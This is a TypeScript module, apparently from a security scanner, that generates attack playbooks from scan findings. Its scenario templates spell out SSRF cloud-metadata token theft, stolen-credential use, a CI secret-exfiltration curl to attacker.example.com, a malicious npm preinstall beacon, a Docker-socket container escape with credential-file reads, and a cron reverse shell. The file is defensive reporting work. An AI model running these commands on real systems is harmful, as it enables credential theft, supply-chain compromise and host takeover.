/**
 * Attack Playbook Generator for WIGTN-SPEAR
 *
 * Takes scan findings and generates step-by-step attack scenarios showing
 * HOW an attacker would exploit discovered vulnerabilities, chaining them
 * together into kill chains.
 *
 * Supported attack chains:
 *   1. SSRF -> Cloud Metadata -> Token Theft
 *   2. Leaked Secret -> Service Takeover
 *   3. CI/CD Pipeline Poisoning
 *   4. Dependency Confusion -> Code Execution
 *   5. Container Escape -> Host Access
 *   6. Social Engineering -> Backdoor (obfuscated code)
 *
 * Each scenario includes actual commands/tools an attacker would use,
 * MITRE ATT&CK technique references, and an executive summary.
 */

import type { Finding } from '@wigtn/shared';

// ─── Types ────────────────────────────────────────────────

export interface AttackStep {
  step: number;
  title: string;
  description: string;
  command?: string;
  tool?: string;
  expectedResult: string;
  mitreTechnique?: string;
}

export interface AttackScenario {
  id: string;
  name: string;
  severity: 'critical' | 'high' | 'medium';
  description: string;
  prerequisites: string[];
  steps: AttackStep[];
  impact: string;
  chainedFindings: string[];
}

export interface AttackPlaybook {
  target: string;
  generatedAt: string;
  totalScenarios: number;
  scenarios: AttackScenario[];
  executiveSummary: string;
}

// ─── Helpers ──────────────────────────────────────────────

/** Case-insensitive check whether a ruleId matches any of the given keywords. */
function ruleIdMatchesAny(ruleId: string, keywords: string[]): boolean {
  const lower = ruleId.toLowerCase();
  return keywords.some((kw) => lower.includes(kw));
}

/** Derive a deterministic scenario id from a prefix and rule ids. */
function scenarioId(prefix: string, ruleIds: string[]): string {
  const hash = ruleIds.sort().join('+');
  return `${prefix}-${simpleHash(hash)}`;
}

/** Tiny numeric hash for id generation (no crypto needed). */
function simpleHash(input: string): string {
  let h = 0;
  for (let i = 0; i < input.length; i++) {
    h = (h * 31 + input.charCodeAt(i)) | 0;
  }
  return Math.abs(h).toString(16).slice(0, 8).padStart(8, '0');
}

/** Extract the file path from a finding, falling back to "unknown". */
function findingFile(f: Finding): string {
  return f.file ?? 'unknown';
}

/** Map a finding severity to a scenario severity (info/low get promoted). */
function findingSeverityToScenario(
  findings: Finding[],
): 'critical' | 'high' | 'medium' {
  for (const f of findings) {
    if (f.severity === 'critical') return 'critical';
  }
  for (const f of findings) {
    if (f.severity === 'high') return 'high';
  }
  return 'medium';
}

/** Deduplicate an array of strings. */
function unique(arr: string[]): string[] {
  return [...new Set(arr)];
}

// ─── Scenario Builders ───────────────────────────────────

function buildSsrfMetadataScenario(findings: Finding[]): AttackScenario {
  const ssrfFindings = findings.filter((f) =>
    ruleIdMatchesAny(f.ruleId, ['ssrf']),
  );
  const ruleIds = unique(ssrfFindings.map((f) => f.ruleId));
  const files = unique(ssrfFindings.map(findingFile));
  const endpoint = files[0] ?? 'target-endpoint';

  return {
    id: scenarioId('SSRF-META', ruleIds),
    name: 'SSRF to Cloud Metadata Token Theft',
    severity: findingSeverityToScenario(ssrfFindings),
    description:
      'An attacker exploits a Server-Side Request Forgery vulnerability to reach the cloud metadata service, ' +
      'extract a service-account token, and pivot to cloud resources.',
    prerequisites: [
      'Application is deployed on a cloud provider (AWS/GCP/Azure)',
      'SSRF-vulnerable endpoint accepts user-controlled URLs',
      'IMDSv1 is enabled or IMDSv2 token hop limit is not restricted',
    ],
    steps: [
      {
        step: 1,
        title: 'Identify SSRF Endpoint',
        description:
          `The scan identified an SSRF-vulnerable parameter in ${files.join(', ')}. ` +
          `The attacker locates the endpoint that accepts a URL and makes server-side requests.`,
        expectedResult:
          'A URL parameter or request body field that triggers server-side HTTP requests.',
        mitreTechnique: 'T1190 - Exploit Public-Facing Application',
      },
      {
        step: 2,
        title: 'Craft Metadata Service Request',
        description:
          'The attacker crafts a request pointing to the cloud metadata service at 169.254.169.254 ' +
          'to enumerate available metadata endpoints.',
        command: `curl -s "https://${endpoint}/fetch?url=http://169.254.169.254/latest/meta-data/"`,
        tool: 'curl',
        expectedResult:
          'A directory listing of metadata categories (ami-id, hostname, iam/, etc.).',
        mitreTechnique: 'T1557 - Adversary-in-the-Middle',
      },
      {
        step: 3,
        title: 'Extract Service Account Token',
        description:
          'The attacker requests the IAM security credentials endpoint to obtain a temporary access token.',
        command: `curl -s "https://${endpoint}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"`,
        tool: 'curl',
        expectedResult:
          'The IAM role name is returned. The attacker then fetches the full credentials.',
        mitreTechnique: 'T1552.005 - Cloud Instance Metadata API',
      },
      {
        step: 4,
        title: 'Use Token to Access Cloud Resources',
        description:
          'With the stolen temporary credentials, the attacker configures their local AWS CLI and accesses cloud resources.',
        command: [
          'export AWS_ACCESS_KEY_ID=<AccessKeyId>',
          'export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>',
          'export AWS_SESSION_TOKEN=<Token>',
          'aws sts get-caller-identity',
        ].join('\n'),
        tool: 'aws-cli',
        expectedResult:
          'The attacker sees the assumed role ARN and account ID, confirming valid credentials.',
        mitreTechnique: 'T1078.004 - Valid Accounts: Cloud Accounts',
      },
      {
        step: 5,
        title: 'Enumerate Permissions and Exfiltrate Data',
        description:
          'The attacker enumerates what the stolen role can access -- S3 buckets, DynamoDB tables, Lambda functions, etc.',
        command: [
          'aws s3 ls',
          'aws dynamodb list-tables',
          'aws lambda list-functions',
        ].join('\n'),
        tool: 'aws-cli',
        expectedResult:
          'A list of accessible cloud resources, potentially containing sensitive data.',
        mitreTechnique: 'T1619 - Cloud Storage Object Discovery',
      },
    ],
    impact:
      'Full read/write access to cloud resources scoped to the compromised service account. ' +
      'Potential data exfiltration, resource manipulation, and lateral movement to other cloud services.',
    chainedFindings: ruleIds,
  };
}

function buildLeakedSecretScenario(findings: Finding[]): AttackScenario {
  const secretFindings = findings.filter((f) =>
    ruleIdMatchesAny(f.ruleId, ['secret', 'env', 'credential', 'key', 'token']),
  );
  const ruleIds = unique(secretFindings.map((f) => f.ruleId));
  const files = unique(secretFindings.map(findingFile));
  const masked =
    secretFindings.find((f) => f.secretMasked)?.secretMasked ?? 'AKIAIOSFODNN7EXAMPLE';

  // Detect the likely service from ruleId or message
  const allText = secretFindings
    .map((f) => `${f.ruleId} ${f.message}`)
    .join(' ')
    .toLowerCase();
  let service = 'AWS';
  let verifyCmd = `aws sts get-caller-identity`;
  let enumCmd = `aws s3 ls\naws iam list-users`;
  let dataCmd = `aws s3 cp s3://target-bucket/sensitive-data.csv .`;

  if (allText.includes('gcp') || allText.includes('google')) {
    service = 'GCP';
    verifyCmd = `gcloud auth activate-service-account --key-file=stolen-key.json\ngcloud auth list`;
    enumCmd = `gcloud projects list\ngcloud storage ls`;
    dataCmd = `gcloud storage cp gs://target-bucket/sensitive-data.csv .`;
  } else if (allText.includes('github')) {
    service = 'GitHub';
    verifyCmd = `curl -s -H "Authorization: token <stolen-token>" https://api.github.com/user`;
    enumCmd = `curl -s -H "Authorization: token <stolen-token>" https://api.github.com/user/repos?per_page=100`;
    dataCmd = `git clone https://<stolen-token>@github.com/org/private-repo.git`;
  } else if (allText.includes('slack')) {
    service = 'Slack';
    verifyCmd = `curl -s -H "Authorization: Bearer <stolen-token>" https://slack.com/api/auth.test`;
    enumCmd = `curl -s -H "Authorization: Bearer <stolen-token>" https://slack.com/api/conversations.list`;
    dataCmd = `curl -s -H "Authorization: Bearer <stolen-token>" "https://slack.com/api/conversations.history?channel=C0123456789"`;
  }

  return {
    id: scenarioId('SECRET', ruleIds),
    name: `Leaked ${service} Secret to Service Takeover`,
    severity: findingSeverityToScenario(secretFindings),
    description:
      `Hardcoded ${service} credentials found in source code allow an attacker to authenticate ` +
      `as the service account and take over associated resources.`,
    prerequisites: [
      `Access to the repository containing ${files.join(', ')}`,
      `The ${service} secret is still active and has not been rotated`,
      `The secret has sufficient permissions for resource access`,
    ],
    steps: [
      {
        step: 1,
        title: 'Extract Secret from Source Code',
        description:
          `The scan identified a leaked ${service} credential in ${files.join(', ')}. ` +
          `The attacker extracts the secret value (masked: ${masked}).`,
        expectedResult: `A valid ${service} credential extracted from the repository.`,
        mitreTechnique: 'T1552.001 - Credentials In Files',
      },
      {
        step: 2,
        title: `Identify ${service} Service Scope`,
        description:
          `The attacker determines which ${service} service the credential belongs to by ` +
          `inspecting the key prefix, file context, and surrounding code.`,
        expectedResult: `Confirmation that the key is a ${service} credential with identifiable scope.`,
        mitreTechnique: 'T1087 - Account Discovery',
      },
      {
        step: 3,
        title: 'Verify Secret Validity',
        description:
          `The attacker tests the credential against the ${service} API to confirm it is still active.`,
        command: verifyCmd,
        tool: service === 'AWS' ? 'aws-cli' : service === 'GCP' ? 'gcloud' : 'curl',
        expectedResult: `Successful authentication response confirming the credential is live.`,
        mitreTechnique: 'T1078 - Valid Accounts',
      },
      {
        step: 4,
        title: 'Enumerate Accessible Resources',
        description:
          `With valid credentials, the attacker enumerates all resources accessible to this identity.`,
        command: enumCmd,
        tool: service === 'AWS' ? 'aws-cli' : service === 'GCP' ? 'gcloud' : 'curl',
        expectedResult: `A list of accessible resources, services, or repositories.`,
        mitreTechnique: 'T1580 - Cloud Infrastructure Discovery',
      },
      {
        step: 5,
        title: 'Demonstrate Data Access',
        description:
          `The attacker accesses sensitive data to demonstrate the impact of the leaked credential.`,
        command: dataCmd,
        tool: service === 'AWS' ? 'aws-cli' : service === 'GCP' ? 'gcloud' : 'curl',
        expectedResult: `Sensitive data successfully retrieved, confirming full service takeover.`,
        mitreTechnique: 'T1530 - Data from Cloud Storage',
      },
    ],
    impact:
      `Complete takeover of the ${service} service account. The attacker can read, modify, and ` +
      `delete resources, potentially escalating to other services via trust relationships.`,
    chainedFindings: ruleIds,
  };
}

function buildCicdPoisoningScenario(findings: Finding[]): AttackScenario {
  const cicdFindings = findings.filter((f) =>
    ruleIdMatchesAny(f.ruleId, ['cicd', 'pin', 'action', 'workflow']),
  );
  const ruleIds = unique(cicdFindings.map((f) => f.ruleId));
  const files = unique(cicdFindings.map(findingFile));

  return {
    id: scenarioId('CICD', ruleIds),
    name: 'CI/CD Pipeline Poisoning via Unpinned Actions',
    severity: findingSeverityToScenario(cicdFindings),
    description:
      'Unpinned GitHub Actions or CI/CD dependencies allow an attacker to inject malicious code ' +
      'that executes within the target build pipeline, exfiltrating secrets and artifacts.',
    prerequisites: [
      `CI/CD workflow files exist at ${files.join(', ')}`,
      'Actions are referenced by mutable tag (e.g., @v1) instead of SHA pin',
      'Attacker can compromise or fork the upstream action repository',
    ],
    steps: [
      {
        step: 1,
        title: 'Identify Unpinned Actions',
        description:
          `The scan found unpinned actions in ${files.join(', ')}. The attacker identifies which ` +
          `third-party actions are referenced by tag instead of commit SHA.`,
        command: `grep -rn "uses:" ${files[0] ?? '.github/workflows/'} | grep -v "@[a-f0-9]\\{40\\}"`,
        tool: 'grep',
        expectedResult: 'A list of GitHub Actions referenced by mutable tag (e.g., actions/checkout@v4).',
        mitreTechnique: 'T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain',
      },
      {
        step: 2,
        title: 'Fork the Action Repository',
        description:
          'The attacker forks the target action repository (or compromises a maintainer account) ' +
          'to inject malicious code into the action.',
        command: `gh repo fork actions/target-action --clone`,
        tool: 'gh',
        expectedResult: 'A forked copy of the action repository under the attacker\'s control.',
        mitreTechnique: 'T1195.002 - Supply Chain Compromise',
      },
      {
        step: 3,
        title: 'Inject Malicious Code into the Action',
        description:
          'The attacker modifies the action entry point to exfiltrate environment secrets ' +
          'before executing the legitimate action logic.',
        command: [
          '# Injected into action.yml entrypoint:',
          'curl -s -X POST https://attacker.example.com/exfil \\',
          '  -d "secrets=$(env | base64)" \\',
          '  -d "github_token=$GITHUB_TOKEN"',
        ].join('\n'),
        tool: 'curl',
        expectedResult: 'Malicious payload inserted into the action code, ready to execute on next CI run.',
        mitreTechnique: 'T1059.004 - Command and Scripting Interpreter: Unix Shell',
      },
      {
        step: 4,
        title: 'Wait for Target CI Run',
        description:
          'The attacker pushes the modified tag to override the existing mutable reference. ' +
          'On the next CI run, the target repository pulls the poisoned action.',
        command: [
          'git tag -d v1 && git tag v1',
          'git push origin v1 --force',
        ].join('\n'),
        tool: 'git',
        expectedResult: 'The mutable tag now points to the compromised commit.',
        mitreTechnique: 'T1072 - Software Deployment Tools',
      },
      {
        step: 5,
        title: 'Exfiltrate Secrets from CI Environment',
        description:
          'When the target repository triggers its workflow, the poisoned action executes and ' +
          'sends all CI secrets (GITHUB_TOKEN, deploy keys, API tokens) to the attacker.',
        expectedResult:
          'CI/CD secrets including GITHUB_TOKEN, deployment credentials, and environment variables ' +
          'received at the attacker-controlled endpoint.',
        mitreTechnique: 'T1528 - Steal Application Access Token',
      },
    ],
    impact:
      'Full compromise of the CI/CD pipeline. The attacker obtains deployment credentials, ' +
      'GITHUB_TOKEN with write access, and can inject backdoors into build artifacts.',
    chainedFindings: ruleIds,
  };
}

function buildDepConfusionScenario(findings: Finding[]): AttackScenario {
  const depFindings = findings.filter((f) =>
    ruleIdMatchesAny(f.ruleId, ['dep-confusion', 'typosquat', 'dependency']),
  );
  const ruleIds = unique(depFindings.map((f) => f.ruleId));
  const files = unique(depFindings.map(findingFile));

  // Try to extract a package name from findings
  const pkgNameMatch = depFindings
    .map((f) => f.message)
    .join(' ')
    .match(/package[:\s]+["']?([a-z@][a-z0-9._/-]*)["']?/i);
  const pkgName = pkgNameMatch?.[1] ?? 'internal-utils';

  return {
    id: scenarioId('DEPCONF', ruleIds),
    name: 'Dependency Confusion to Remote Code Execution',
    severity: findingSeverityToScenario(depFindings),
    description:
      'An unscoped internal package name can be hijacked on the public npm registry, ' +
      'allowing an attacker to execute arbitrary code during installation.',
    prerequisites: [
      `Package manifest found at ${files.join(', ')}`,
      `Internal package "${pkgName}" is not registered on the public npm registry`,
      'The build system does not enforce a scoped registry for internal packages',
    ],
    steps: [
      {
        step: 1,
        title: 'Identify Unscoped Internal Package',
        description:
          `The scan identified an unscoped package "${pkgName}" in ${files.join(', ')} ` +
          'that may not be claimed on the public npm registry.',
        command: `npm view ${pkgName} --json 2>&1 || echo "Package not found on public npm"`,
        tool: 'npm',
        expectedResult: `404 response confirming "${pkgName}" is not on the public registry.`,
        mitreTechnique: 'T1195.001 - Supply Chain Compromise: Compromise Software Dependencies',
      },
      {
        step: 2,
        title: 'Register Package on Public npm',
        description:
          'The attacker claims the package name on the public npm registry ' +
          'before the organization does.',
        command: [
          `mkdir ${pkgName} && cd ${pkgName}`,
          `npm init -y --name ${pkgName}`,
        ].join('\n'),
        tool: 'npm',
        expectedResult: `Package "${pkgName}" initialized and ready for publishing.`,
        mitreTechnique: 'T1584.006 - Compromise Infrastructure: Web Services',
      },
      {
        step: 3,
        title: 'Add Malicious Postinstall Script',
        description:
          'The attacker adds a postinstall script that executes arbitrary code ' +
          'as soon as the package is installed by the victim.',
        command: [
          '# package.json',
          '{',
          `  "name": "${pkgName}",`,
          '  "version": "99.0.0",',
          '  "scripts": {',
          '    "preinstall": "node -e \\"require(\'child_process\').execSync(\'curl https://attacker.example.com/beacon?host=\'+require(\'os\').hostname())\\""',
          '  }',
          '}',
        ].join('\n'),
        tool: 'npm',
        expectedResult: 'Malicious package.json with preinstall hook ready for publishing.',
        mitreTechnique: 'T1059.007 - Command and Scripting Interpreter: JavaScript',
      },
      {
        step: 4,
        title: 'Publish with Higher Version',
        description:
          'The attacker publishes the malicious package with a high version number ' +
          '(99.0.0) so that version resolution prefers it over any private registry.',
        command: `npm publish --access public`,
        tool: 'npm',
        expectedResult: `Package "${pkgName}@99.0.0" is live on the public npm registry.`,
        mitreTechnique: 'T1195.001 - Supply Chain Compromise',
      },
      {
        step: 5,
        title: 'Wait for Victim Install',
        description:
          'On the next `npm install` in the target project, npm resolves the higher version ' +
          'from the public registry and executes the preinstall hook.',
        command: `# Victim runs:\nnpm install`,
        tool: 'npm',
        expectedResult:
          'Beacon received at attacker endpoint confirming code execution on victim machine.',
        mitreTechnique: 'T1204.002 - User Execution: Malicious File',
      },
    ],
    impact:
      'Remote code execution on every machine that runs `npm install` for the project, ' +
      'including developer workstations and CI/CD build servers. The attacker can steal ' +
      'credentials, install backdoors, and pivot to internal systems.',
    chainedFindings: ruleIds,
  };
}

function buildContainerEscapeScenario(findings: Finding[]): AttackScenario {
  const containerFindings = findings.filter((f) =>
    ruleIdMatchesAny(f.ruleId, ['container', 'docker', 'privileged', 'k8s']),
  );
  const ruleIds = unique(containerFindings.map((f) => f.ruleId));
  const files = unique(containerFindings.map(findingFile));

  return {
    id: scenarioId('CONTAINER', ruleIds),
    name: 'Container Escape to Host Access',
    severity: findingSeverityToScenario(containerFindings),
    description:
      'A misconfigured container running as root with a mounted Docker socket or excessive privileges ' +
      'enables an attacker to escape the container and access the host system.',
    prerequisites: [
      `Container configuration found in ${files.join(', ')}`,
      'Container runs as root (UID 0) or has privileged flag',
      'Docker socket is mounted or capabilities are not dropped',
    ],
    steps: [
      {
        step: 1,
        title: 'Identify Root-Running Container',
        description:
          `The scan found a container running as root in ${files.join(', ')}. ` +
          'The attacker confirms they have root access inside the container.',
        command: `id\ncat /proc/1/status | grep -i cap`,
        tool: 'shell',
        expectedResult: 'uid=0(root) with elevated Linux capabilities.',
        mitreTechnique: 'T1610 - Deploy Container',
      },
      {
        step: 2,
        title: 'Access Mounted Docker Socket',
        description:
          'The attacker checks for a mounted Docker socket that provides full control ' +
          'over the Docker daemon on the host.',
        command: `ls -la /var/run/docker.sock\ncurl --unix-socket /var/run/docker.sock http://localhost/version`,
        tool: 'curl',
        expectedResult: 'Docker API responds with engine version, confirming socket access.',
        mitreTechnique: 'T1611 - Escape to Host',
      },
      {
        step: 3,
        title: 'Create Privileged Container with Host Mount',
        description:
          'Using the Docker socket, the attacker creates a new privileged container ' +
          'that mounts the host root filesystem.',
        command: [
          'docker run -it --rm --privileged \\',
          '  -v /:/host \\',
          '  --pid=host --net=host \\',
          '  alpine:latest chroot /host /bin/sh',
        ].join('\n'),
        tool: 'docker',
        expectedResult: 'A shell running in a new container with full access to the host filesystem at /host.',
        mitreTechnique: 'T1611 - Escape to Host',
      },
      {
        step: 4,
        title: 'Mount and Access Host Filesystem',
        description:
          'The attacker navigates the mounted host filesystem to access sensitive files ' +
          'like SSH keys, cloud credentials, and application secrets.',
        command: [
          'cat /host/etc/shadow',
          'cat /host/root/.ssh/id_rsa',
          'cat /host/root/.aws/credentials',
          'ls /host/var/run/secrets/kubernetes.io/serviceaccount/',
        ].join('\n'),
        tool: 'shell',
        expectedResult: 'Host SSH keys, cloud credentials, and Kubernetes service account tokens.',
        mitreTechnique: 'T1552.001 - Credentials In Files',
      },
      {
        step: 5,
        title: 'Persist Access on Host',
        description:
          'The attacker establishes persistence on the host by adding SSH keys, ' +
          'creating a cron job, or modifying systemd services.',
        command: [
          'echo "attacker-ssh-public-key" >> /host/root/.ssh/authorized_keys',
          'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1\'" >> /host/var/spool/cron/root',
        ].join('\n'),
        tool: 'shell',
        expectedResult: 'Persistent reverse shell access to the host system.',
        mitreTechnique: 'T1053.003 - Scheduled Task/Job: Cron',
      },
    ],
    impact:
      'Full root access to the container host. The attacker can access all containers on the host, ' +
      'steal credentials, pivot to the Kubernetes cluster, and establish persistent backdoors.',
    chainedFindings: ruleIds,
  };
}

function buildSocialEngineeringScenario(findings: Finding[]): AttackScenario {
  const socengFindings = findings.filter((f) =>
    ruleIdMatchesAny(f.ruleId, ['soceng', 'hidden', 'obfuscat', 'backdoor', 'trojan']),
  );
  const ruleIds = unique(socengFindings.map((f) => f.ruleId));
  const files = unique(socengFindings.map(findingFile));

  return {
    id: scenarioId('SOCENG', ruleIds),
    name: 'Social Engineering Backdoor via Obfuscated Code',
    severity: findingSeverityToScenario(socengFindings),
    description:
      'Obfuscated or hidden code has been injected into the codebase, likely through a social engineering ' +
      'attack (malicious PR, compromised maintainer). The code conceals malicious behavior.',
    prerequisites: [
      `Suspicious obfuscated code identified in ${files.join(', ')}`,
      'Code was introduced via a pull request or direct commit',
      'Review process did not catch the obfuscated payload',
    ],
    steps: [
      {
        step: 1,
        title: 'Identify Obfuscated Code Location',
        description:
          `The scan flagged suspicious obfuscated code in ${files.join(', ')}. ` +
          'The analyst identifies hex-encoded strings, unicode escapes, or eval() usage.',
        command: `grep -n "\\\\x[0-9a-f]\\{2\\}\\|\\\\u[0-9a-f]\\{4\\}\\|eval(\\|Function(" ${files[0] ?? 'src/'}`,
        tool: 'grep',
        expectedResult: 'Lines containing hex/unicode-encoded strings or dynamic code execution.',
        mitreTechnique: 'T1027 - Obfuscated Files or Information',
      },
      {
        step: 2,
        title: 'Decode the Hidden Payload',
        description:
          'The analyst decodes the hex/unicode sequences to reveal the actual code being executed.',
        command: [
          `node -e "console.log(Buffer.from('68747470733a2f2f6174746163', 'hex').toString())"`,
          `# Or for unicode escapes:`,
          `node -e "console.log('\\\\u0065\\\\u0076\\\\u0061\\\\u006c')"`,
        ].join('\n'),
        tool: 'node',
        expectedResult: 'Decoded payload reveals URLs, commands, or data exfiltration logic.',
        mitreTechnique: 'T1140 - Deobfuscate/Decode Files or Information',
      },
      {
        step: 3,
        title: 'Analyze Malicious Behavior',
        description:
          'The analyst traces what the decoded payload does -- network calls, file access, ' +
          'credential harvesting, or reverse shell establishment.',
        command: `# Static analysis of decoded payload:\nnode --inspect-brk suspicious-file.js`,
        tool: 'node',
        expectedResult:
          'Understanding of the malicious behavior: data exfiltration target, stolen data type, ' +
          'and communication protocol.',
        mitreTechnique: 'T1059.007 - Command and Scripting Interpreter: JavaScript',
      },
      {
        step: 4,
        title: 'Trace Data Flow and Impact',
        description:
          'The analyst determines what data the backdoor accesses and where it sends it, ' +
          'identifying the full scope of the compromise.',
        command: [
          `git log --all --oneline -- ${files[0] ?? 'suspicious-file'}`,
          `git show $(git log --all --oneline -- ${files[0] ?? 'suspicious-file'} | head -1 | cut -d" " -f1)`,
        ].join('\n'),
        tool: 'git',
        expectedResult:
          'The commit that introduced the malicious code, the author, and the full change context.',
        mitreTechnique: 'T1195.002 - Supply Chain Compromise',
      },
    ],
    impact:
      'Active backdoor in the codebase exfiltrating sensitive data. All deployments running this code ' +
      'are compromised. The attacker has ongoing access to application data and credentials.',
    chainedFindings: ruleIds,
  };
}

// ─── Chain Detection ─────────────────────────────────────

/** Keyword groups for each scenario type. */
const SCENARIO_TRIGGERS = {
  ssrf: ['ssrf'],
  secret: ['secret', 'env', 'credential', 'key', 'token', 'api-key', 'apikey'],
  cicd: ['cicd', 'pin', 'action', 'workflow'],
  depConfusion: ['dep-confusion', 'typosquat', 'dependency'],
  container: ['container', 'docker', 'privileged', 'k8s'],
  soceng: ['soceng', 'hidden', 'obfuscat', 'backdoor', 'trojan'],
} as const;

interface ScenarioMatch {
  type: keyof typeof SCENARIO_TRIGGERS;
  findings: Finding[];
  builder: (findings: Finding[]) => AttackScenario;
}

/**
 * Detect which scenario templates can be generated from the given findings.
 * Returns one match per trigger group that has at least one matching finding.
 */
function detectScenarios(findings: Finding[]): ScenarioMatch[] {
  const builders: Record<keyof typeof SCENARIO_TRIGGERS, (f: Finding[]) => AttackScenario> = {
    ssrf: buildSsrfMetadataScenario,
    secret: buildLeakedSecretScenario,
    cicd: buildCicdPoisoningScenario,
    depConfusion: buildDepConfusionScenario,
    container: buildContainerEscapeScenario,
    soceng: buildSocialEngineeringScenario,
  };

  const matches: ScenarioMatch[] = [];

  for (const [type, keywords] of Object.entries(SCENARIO_TRIGGERS)) {
    const matched = findings.filter((f) =>
      ruleIdMatchesAny(f.ruleId, keywords as unknown as string[]),
    );
    if (matched.length > 0) {
      matches.push({
        type: type as keyof typeof SCENARIO_TRIGGERS,
        findings: matched,
        builder: builders[type as keyof typeof SCENARIO_TRIGGERS],
      });
    }
  }

  return matches;
}

/**
 * Look for cross-scenario chains where findings from different categories
 * appear in the same file, indicating a compound attack surface.
 */
function detectCrossChains(findings: Finding[]): AttackScenario[] {
  const scenarios: AttackScenario[] = [];

  // Group findings by file
  const byFile = new Map<string, Finding[]>();
  for (const f of findings) {
    const file = findingFile(f);
    if (file === 'unknown') continue;
    let group = byFile.get(file);
    if (!group) {
      group = [];
      byFile.set(file, group);
    }
    group.push(f);
  }

  // Check for SSRF + cloud/secret combo in same file or related files
  const ssrfFindings = findings.filter((f) => ruleIdMatchesAny(f.ruleId, ['ssrf']));
  const cloudFindings = findings.filter((f) =>
    ruleIdMatchesAny(f.ruleId, ['cloud', 'aws', 'gcp', 'azure', 'metadata']),
  );

  if (ssrfFindings.length > 0 && cloudFindings.length > 0) {
    const combined = [...ssrfFindings, ...cloudFindings];
    const ruleIds = unique(combined.map((f) => f.ruleId));
    scenarios.push({
      id: scenarioId('CHAIN-SSRF-CLOUD', ruleIds),
      name: 'SSRF + Cloud Infrastructure: Full Account Compromise',
      severity: 'critical',
      description:
        'SSRF vulnerabilities combined with cloud infrastructure indicators suggest the attacker ' +
        'can chain these findings to achieve full cloud account compromise via metadata service abuse.',
      prerequisites: [
        'SSRF-vulnerable endpoint is reachable from the internet',
        'Application runs on cloud infrastructure (AWS/GCP/Azure)',
        'Cloud metadata service is accessible from the application',
      ],
      steps: [
        ...buildSsrfMetadataScenario(findings).steps,
        {
          step: 6,
          title: 'Escalate via Cloud Trust Relationships',
          description:
            'Using the stolen service account, the attacker explores cross-account roles, ' +
            'VPC peering, and shared resources to expand access.',
          command: [
            'aws iam list-roles --query "Roles[?AssumeRolePolicyDocument]"',
            'aws organizations list-accounts',
          ].join('\n'),
          tool: 'aws-cli',
          expectedResult: 'Additional roles and accounts that can be assumed for lateral movement.',
          mitreTechnique: 'T1078.004 - Valid Accounts: Cloud Accounts',
        },
      ],
      impact:
        'Critical: Multi-stage attack from SSRF to full cloud account takeover. ' +
        'Potential access to all cloud resources, cross-account movement, and data exfiltration.',
      chainedFindings: ruleIds,
    });
  }

  return scenarios;
}

// ─── Severity Sorting ────────────────────────────────────

const SEVERITY_ORDER: Record<string, number> = {
  critical: 0,
  high: 1,
  medium: 2,
};

function sortScenarios(scenarios: AttackScenario[]): AttackScenario[] {
  return scenarios.sort((a, b) => {
    const sevDiff = (SEVERITY_ORDER[a.severity] ?? 3) - (SEVERITY_ORDER[b.severity] ?? 3);
    if (sevDiff !== 0) return sevDiff;
    // Longer chains rank higher (more dangerous)
    return b.steps.length - a.steps.length;
  });
}

// ─── Executive Summary ───────────────────────────────────

function buildExecutiveSummary(scenarios: AttackScenario[]): string {
  if (scenarios.length === 0) {
    return 'No actionable attack scenarios were identified from the scan findings.';
  }

  const criticalCount = scenarios.filter((s) => s.severity === 'critical').length;
  const highCount = scenarios.filter((s) => s.severity === 'high').length;
  const mediumCount = scenarios.filter((s) => s.severity === 'medium').length;

  const parts: string[] = [];

  parts.push(
    `Analysis identified ${scenarios.length} attack scenario${scenarios.length === 1 ? '' : 's'} ` +
    `that can be constructed from the scan findings` +
    `${criticalCount > 0 ? `, including ${criticalCount} critical-severity chain${criticalCount === 1 ? '' : 's'}` : ''}.`,
  );

  // Top 3 risks
  const top3 = scenarios.slice(0, 3);
  parts.push('');
  parts.push('Top risks:');
  for (let i = 0; i < top3.length; i++) {
    const s = top3[i]!;
    parts.push(
      `${i + 1}. [${s.severity.toUpperCase()}] ${s.name} - ${s.impact.split('.')[0]}.`,
    );
  }

  // Summary statistics
  const totalSteps = scenarios.reduce((sum, s) => sum + s.steps.length, 0);
  const uniqueRuleIds = unique(scenarios.flatMap((s) => s.chainedFindings));
  parts.push('');
  parts.push(
    `These scenarios chain ${uniqueRuleIds.length} unique finding${uniqueRuleIds.length === 1 ? '' : 's'} ` +
    `into ${totalSteps} total attack steps. ` +
    `Severity breakdown: ${criticalCount} critical, ${highCount} high, ${mediumCount} medium.`,
  );

  return parts.join('\n');
}

// ─── Public API ──────────────────────────────────────────

/**
 * Generate an attack playbook from scan findings.
 *
 * Analyzes findings for known attack patterns, chains related
 * vulnerabilities into multi-step scenarios, and produces an
 * actionable playbook with actual exploitation commands.
 *
 * @param findings - Array of findings from a completed SPEAR scan
 * @param target - Name or identifier of the scan target
 * @returns A complete AttackPlaybook with scenarios and executive summary
 */
export function generateAttackPlaybook(
  findings: Finding[],
  target: string,
): AttackPlaybook {
  // 1. Detect individual scenario matches
  const matches = detectScenarios(findings);
  const scenarios: AttackScenario[] = matches.map((m) => m.builder(findings));

  // 2. Detect cross-chain scenarios
  const crossChains = detectCrossChains(findings);
  scenarios.push(...crossChains);

  // 3. Sort by severity and chain length
  const sorted = sortScenarios(scenarios);

  // 4. Build executive summary
  const executiveSummary = buildExecutiveSummary(sorted);

  return {
    target,
    generatedAt: new Date().toISOString(),
    totalScenarios: sorted.length,
    scenarios: sorted,
    executiveSummary,
  };
}

/**
 * Format an AttackPlaybook as a Markdown document.
 *
 * Produces a human-readable report with scenario details,
 * exploitation commands, and MITRE ATT&CK references.
 *
 * @param playbook - The generated attack playbook
 * @returns Markdown-formatted string
 */
export function formatPlaybookMarkdown(playbook: AttackPlaybook): string {
  const lines: string[] = [];

  // Header
  lines.push(`# Attack Playbook: ${playbook.target}`);
  lines.push(
    `> Generated: ${playbook.generatedAt} | Scenarios: ${playbook.totalScenarios}`,
  );
  lines.push('');

  // Executive Summary
  lines.push('## Executive Summary');
  lines.push(playbook.executiveSummary);
  lines.push('');

  // Scenarios
  for (let i = 0; i < playbook.scenarios.length; i++) {
    const scenario = playbook.scenarios[i]!;
    const severityLabel = scenario.severity.toUpperCase();

    lines.push(`## Scenario ${i + 1}: ${scenario.name} [${severityLabel}]`);
    lines.push(`**Impact**: ${scenario.impact}`);
    lines.push(
      `**Chained Vulnerabilities**: ${scenario.chainedFindings.join(', ')}`,
    );
    lines.push('');

    // Prerequisites
    lines.push('### Prerequisites');
    for (const prereq of scenario.prerequisites) {
      lines.push(`- ${prereq}`);
    }
    lines.push('');

    // Steps
